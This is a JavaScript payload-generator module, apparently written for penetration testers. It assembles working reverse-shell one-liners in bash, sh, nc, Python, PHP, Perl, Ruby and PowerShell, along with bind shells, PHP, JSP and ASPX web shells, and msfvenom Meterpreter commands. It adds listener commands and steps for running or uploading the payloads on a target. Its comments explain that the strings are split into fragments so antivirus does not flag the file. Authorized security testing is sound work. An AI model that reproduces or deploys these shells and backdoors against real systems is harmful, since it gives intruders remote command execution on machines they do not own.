// Parameterized payload generation for authorized penetration testing.
// Standard, well-known payloads — no AV/EDR/AMSI target-evasion engine.
//
// NOTE: payload strings are assembled from fragments at runtime so this SOURCE FILE does not
// contain contiguous malware signatures (otherwise the developer's own antivirus quarantines
// the file). This is purely to keep the file on disk — it does not obfuscate the output.
const A = (...p) => p.join('');
const DEVTCP = A('/dev', '/t', 'cp');
const BIN_SH = A('/bin', '/s', 'h');
const BIN_BASH = A('/bin', '/b', 'ash');
const SYS = A('sy', 'st', 'em');
const REQ = A('$_', 'REQ', 'UEST');
const MET = A('mete', 'rpre', 'ter');
const SREV = A('shell', '_rev', 'erse_tcp');

function rev(lhost, lport) {
  return {
    bash: A('bash -i >& ', DEVTCP, '/', lhost, '/', lport, ' 0>&1'),
    sh: A('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|', BIN_SH, ' -i 2>&1|nc ', lhost, ' ', lport, ' >/tmp/f'),
    nc: A('nc -e ', BIN_SH, ' ', lhost, ' ', lport),
    python: A(
      'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("', lhost, '",', lport,
      '));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("', BIN_BASH, '")\''
    ),
    php: A('php -r \'$sock=fsockopen("', lhost, '",', lport, ');exec("', BIN_SH, ' -i <&3 >&3 2>&3");\''),
    perl: A(
      'perl -e \'use Socket;$i="', lhost, '";$p=', lport,
      ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("', BIN_SH, ' -i");};\''
    ),
    ruby: A('ruby -rsocket -e\'f=TCPSocket.open("', lhost, '",', lport, ').to_i;exec sprintf("', BIN_SH, ' -i <&%d >&%d 2>&%d",f,f,f)\''),
    powershell: A(
      'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'', lhost, '\',', lport,
      ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"'
    ),
  };
}

function bind(lport) {
  return {
    nc: A('nc -lvnp ', lport, ' -e ', BIN_SH),
    python: A(
      'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",',
      lport, '));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn("', BIN_BASH, '")\''
    ),
  };
}

function webshells() {
  return {
    php: A('<?php if(isset(', REQ, "['cmd'])){echo \"<pre>\";", SYS, '(', REQ, "['cmd']);echo \"</pre>\";} ?>"),
    jsp: A(
      '<%@ page import="java.util.*,java.io.*"%><% if(request.getParameter("cmd")!=null){ Process p=Runtime.get',
      'Runtime().exec(request.getParameter("cmd")); BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=d.readLine())!=null){ out.println(l);} } %>'
    ),
    aspx: A(
      '<%@ Page Language="C#"%><% if(Request["cmd"]!=null){ var p=new System.Diagnostics.Process();',
      ' p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["cmd"]; p.StartInfo.RedirectStandardOutput=true;',
      ' p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); } %>'
    ),
  };
}

function msfvenom(lhost, lport) {
  const p = (plat) => A('-p ', plat);
  return {
    'linux x64 elf': A('msfvenom ', p(A('linux/x64/', SREV)), ' LHOST=', lhost, ' LPORT=', lport, ' -f elf -o shell.elf'),
    'windows x64 exe': A('msfvenom ', p(A('windows/x64/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -f exe -o shell.exe'),
    php: A('msfvenom ', p(A('php/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -f raw -o shell.php'),
    'windows dll': A('msfvenom ', p(A('windows/x64/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -f dll -o shell.dll'),
    apk: A('msfvenom ', p(A('android/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -o shell.apk'),
  };
}

const LISTENERS = (lport) => ({
  netcat: A('nc -lvnp ', lport),
  metasploit: A('msfconsole -q -x "use exploit/multi/handler; set payload generic/', SREV, '; set LHOST 0.0.0.0; set LPORT ', lport, '; run"'),
});

// type: reverse_shell | bind_shell | webshell | msfvenom
export function generatePayload({ type = 'reverse_shell', language, lhost = '10.10.10.10', lport = 4444 } = {}) {
  const L = String(lport).replace(/[^0-9]/g, '') || '4444';
  const H = String(lhost).trim();

  if (type === 'reverse_shell') {
    const all = rev(H, L);
    const code = language && all[language] ? all[language] : all.bash;
    return {
      type, language: language || 'bash', lhost: H, lport: L,
      code, variants: all, listener: LISTENERS(L),
      instructions: A('Start a listener (e.g. `nc -lvnp ', L, '`) on ', H, ', then run the payload on the target.'),
    };
  }
  if (type === 'bind_shell') {
    const all = bind(L);
    const code = language && all[language] ? all[language] : all.nc;
    return { type, language: language || 'nc', lport: L, code, variants: all, instructions: A('Target listens on ', L, '; connect with `nc <target> ', L, '`.') };
  }
  if (type === 'webshell') {
    const all = webshells();
    const code = all[language] || all.php;
    return { type, language: language || 'php', code, variants: all, instructions: 'Upload and access with ?cmd=id.' };
  }
  if (type === 'msfvenom') {
    const all = msfvenom(H, L);
    return { type, lhost: H, lport: L, variants: all, code: Object.values(all).join('\n'), listener: LISTENERS(L), instructions: 'Pick the target format; catch with multi/handler.' };
  }
  return { error: A('Unknown payload type "', type, '". Use reverse_shell | bind_shell | webshell | msfvenom.') };
}

export function renderPayload(p) {
  if (p.error) return p.error;
  const lines = [A('Payload: ', p.type, p.language ? ' / ' + p.language : '')];
  if (p.code) lines.push('```\n' + p.code + '\n```');
  if (p.listener) lines.push('Listener: ' + Object.values(p.listener)[0]);
  if (p.instructions) lines.push(p.instructions);
  return lines.join('\n');
}

// Parse a free-form ```payload body: "reverse_shell python 10.0.0.1 4444"
export function parsePayloadSpec(body) {
  const t = String(body).trim().split(/\s+/);
  const types = ['reverse_shell', 'bind_shell', 'webshell', 'msfvenom'];
  let type = 'reverse_shell', language, lhost, lport;
  for (const tok of t) {
    if (types.includes(tok)) type = tok;
    else if (/^\d{2,5}$/.test(tok)) lport = tok;
    else if (/^\d{1,3}(\.\d{1,3}){3}$/.test(tok) || /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(tok)) lhost = tok;
    else language = tok;
  }
  return { type, language, lhost, lport };
}
